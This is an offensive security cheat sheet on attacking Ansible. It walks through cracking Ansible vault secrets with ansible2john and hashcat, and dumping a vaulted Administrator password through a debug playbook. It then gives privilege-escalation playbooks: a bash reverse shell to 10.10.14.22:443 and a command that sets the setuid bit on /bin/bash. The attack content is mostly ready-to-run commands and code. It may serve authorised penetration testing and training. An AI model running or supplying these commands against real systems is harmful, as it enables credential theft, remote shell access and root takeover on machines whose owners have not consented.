# Cracking Vaults
When you save a secret into Ansible vault it look like something similar:
```
pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438
```
To crack it you need to do following:
1.  Export the secret  
    `cat ansible_file.yml | yq -r ".variable_name" > tmp_file.txt`
2.  Parse it via Ansible2john.py  
    `ansible2john.py tmp_file.txt > tmp_file.in`
3.  Crack it with Hashcat:  
    `hashcat -m 16900 -O -a 0 -w 4 tmp_file.in seclists/Passwords/darkc0de.txt`
4.  De-crypt the result with the password found in step 3(you have to use the original sting and not the John one!)  
    `cat tmp_file.txt | ansible-vault decrypt`


# Export password from vault
How to decrypt a password hardcoded in a playbook? 
(aka it fetches from the vault itself)

Example:
```
D3V\james.weeks@d3webal:/Ansible$ cat group_vars/d3v.yml 
---
#winrm options
ansible_user: Administrator@D3V.LOCAL
ansible_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63363635373431386163616636666139336266336165623733316437326432303732393535346666
          6437356362333338333331396438333933613036313732630a613238666466383434343966613065
          36333336306663666537646362316366376131633566643961343032373063613861333263636661
          6231386131643236310a336633323533623630336637396538383137616532643432613432323964
          6362
ansible_connection: winrm
ansible_port: 5985
ansible_winrm_transport: kerberos
ansible_winrm_operation_timeout_sec: 2700
ansible_winrm_read_timeout_sec: 2800
```
1. Create a new playbook that exports the vault in cleartext (**extract_password.yml)**
```
# extract_password.yml
---
- name: Extract and use encrypted password
  hosts: localhost
  gather_facts: no
  vars_files:
    - d3v.yml

  tasks:
    - name: Display decrypted password
      debug:
        msg: "The decrypted password is: {{ ansible_password }}"

```
2. Run the playbook to export the password.
```
 ansible-playbook --ask-vault-password extract_password.yml
```
3. Enjoy!


# PE via Ansible playbooks
## Reverse shells
```
- hosts: localhost
  tasks:
  - name: rev
    shell: bash -c 'bash -i >& /dev/tcp/10.10.14.22/443 0>&1'
```
## Setuid
```
- name: "whatever"
  hosts: localhost
  connection: local
  tasks:
    - name: "whatever"
      shell: "chmod +s /bin/bash"
      register: "output"
```


# Useful tips
[https://ppn.snovvcrash.rocks/pentest/infrastructure/devops/ansible]()